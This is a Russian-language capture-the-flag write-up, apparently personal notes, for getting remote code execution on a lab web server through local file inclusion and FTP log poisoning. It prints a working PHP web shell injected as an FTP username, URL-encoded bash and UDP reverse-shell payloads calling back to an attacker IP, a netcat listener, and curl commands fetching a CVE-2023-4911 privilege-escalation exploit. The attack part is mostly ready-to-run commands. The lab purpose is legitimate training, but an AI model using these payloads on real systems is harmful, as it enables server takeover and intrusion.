---
attack: " log poisoning"
---
 
Получите RCE на узле [www.edu.stf](http://www.edu.stf) (10.124.1.235) посредством LFI.  
Для получения флага выполните скрипт /home/rceflag.

**Если вы пришли сюда так как не получись решить самостоятельно то предлагаю вам не смотреть решение  ,а воспользоваться моей подсказкой** 
read this : https://readmedium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d

Заметка вне категории чтобы читать Medium -> меняем домен на readmedium
 
#### solution
Если вы разобрались или скорее поняли как она работает у вас не будет проблем с тем как вызвать след файл /etc/passwd он из файловой системы Linux его часто используют для того чтобы понять есть уязвимость или нет. **Почему именно этот файл а не другой?** Потому что он расположен статично и можно точно знать что он есть или его нет, тип другие файлы могут иметь не стандартные названия а этот будет называться всегда так

из etc passwd можно увидеть след информацию :
`ftp:x:103:111:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin`
что это? наш любимый или не очень Ftp user 

Давайте также не забывать про Nmap 
```
 nmap 10.124.1.235                 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 12:15 EDT
Nmap scan report for www.edu.stf (10.124.1.235)
Host is up (0.0063s latency).
Not shown: 965 filtered tcp ports (no-response), 31 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
1720/tcp open  h323q931

```
Также вы можете перебрать файловую систему в поисках чего то интересного  через burp + intruder так я там нашёл файл логов FTP 
https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Linux

#### attack 
шаг 0    rlwrap nc -lnvp 4444
Алгоритм атаки  подключаемся по фтп 1
2 вводим  в имя `<?php system($_GET["cmd"]);?>` далее любой  пароль 
и к этому моменту  нужно уже* иметь готовую команду в вебе (для запроса в url)

подробнее тут про эту атаку тут 
https://medium.com/@omarwhadidi9/10-ways-to-get-rce-from-lfi-f2bb696b67f6
https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d


```
└─$ ftp 10.124.1.235                                                                                              
Connected to 10.124.1.235.
220 (vsFTPd 3.0.3)
Name (10.124.1.235:kali): <?php system($_GET["cmd"]);?>
 

10.124.1.235/api/read.php?file=/var/log/vsftpd.log&cmd=bash -i >%26 %2Fdev%2Ftcp%2F10.127.246.200%2F4444 0>%261

Victim:
sh -i >& /dev/udp/10.0.0.1/4242 0>&1

Listener:
nc -u -lvp 4242
```
![[Pasted image 20240913145731.png]]

Примечание вижу как вы не годуете , да нужно было еще методом проб и ошибок понять что revershell нужно было закодировать 
revershell обычно берём отсюда https://www.revshells.com/ 
![[Pasted image 20240913145924.png]]
```
10.124.1.235/api/read.php?file=/var/log/vsftpd.log&cmd=bash -i >%26 %2Fdev%2Ftcp%2F10.127.IP.IP%2F4444 0>%261
```




 
```
curl -L -o libc.py https://raw.githubusercontent.com/leesh3288/CVE-2023-4911/main/libc.py
curl -L -o exp.c https://raw.githubusercontent.com/leesh3288/CVE-2023-4911/main/exp.c
```


```
curl -o libc.py http://10.127.244.55:4545/libc.py
curl -o exp.c http://10.127.244.55:4545/exp.c

```



#### attack 2
21/tcp open  ftp     vsftpd 3.0.3
